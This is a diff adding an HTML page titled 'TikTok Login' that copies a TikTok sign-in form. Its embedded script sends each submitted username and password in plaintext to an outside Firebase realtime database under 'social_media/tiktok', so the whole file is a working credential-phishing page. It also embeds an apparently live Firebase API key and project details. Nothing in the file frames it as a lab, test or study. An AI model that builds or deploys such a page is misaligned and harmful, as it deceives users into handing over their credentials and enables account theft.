@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f8f8;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        .login-container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #ff0066;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #cc0052;
+        }
+
+        .form-footer {
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .form-footer a {
+            color: #666;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="main" class="login-container">
+        <h2>Login</h2>
+        <form id="login-form">
+            <input id="email" type="text" name="username" placeholder="Email or username" required>
+            <input id="password" type="password" name="password" placeholder="Password" required>
+            <input id="submit" type="submit" value="Login">
+        </form>
+        <div class="form-footer">
+            <a href="#" id="sign-up">Create Account</a>
+        </div>
+    </div>
+
+    <div id="create-acct" class="login-container" style="display: none;">
+        <h2>Sign Up</h2>
+        <form id="signup-form">
+            <input id="email-signup" type="text" placeholder="Email" required>
+            <input id="confirm-email-signup" type="text" placeholder="Confirm Email" required>
+            <input id="password-signup" type="password" placeholder="Password" required>
+            <input id="confirm-password-signup" type="password" placeholder="Confirm Password" required>
+            <button id="create-acct-btn" type="button">Create Account</button>
+            <div class="form-footer">
+                <a href="#" id="return-btn">Back to Login</a>
+            </div>
+        </form>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
+        import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+        apiKey: "AIzaSyA5UGxuO54bJOOhFW5w80eQLCPYc8XDlWg",
+        authDomain: "snaf-cd0cf.firebaseapp.com",
+        databaseURL: "https://snaf-cd0cf-default-rtdb.firebaseio.com",
+        projectId: "snaf-cd0cf",
+        storageBucket: "snaf-cd0cf.appspot.com",
+        messagingSenderId: "866265305755",
+        appId: "1:866265305755:web:832bb14ce2fa65fcbeec3e",
+        measurementId: "G-9FGYBRMG7G"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Form handling
+        document.getElementById("login-form").addEventListener("submit", function (event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        const username = event.target.username.value; // Get the username input
+        const password = event.target.password.value; // Get the password input
+
+        if (username && password) {
+            const tiktokRef = ref(database, 'social_media/tiktok'); // Reference to social_media/tiktok
+            const newEntry = push(tiktokRef); // Generate a unique key for the new entry
+
+            set(newEntry, {
+            username: username,
+            password: password
+            })
+            .then(() => {
+                alert("Data saved successfully!");
+                console.log("Data saved:", { username, password });
+            })
+            .catch((error) => {
+                alert("Failed to save data. Please try again.");
+                console.error("Error:", error);
+            });
+        } else {
+            alert("Please fill in all fields.");
+        }
+        });
+
+    </script>
+</body>
+</html>
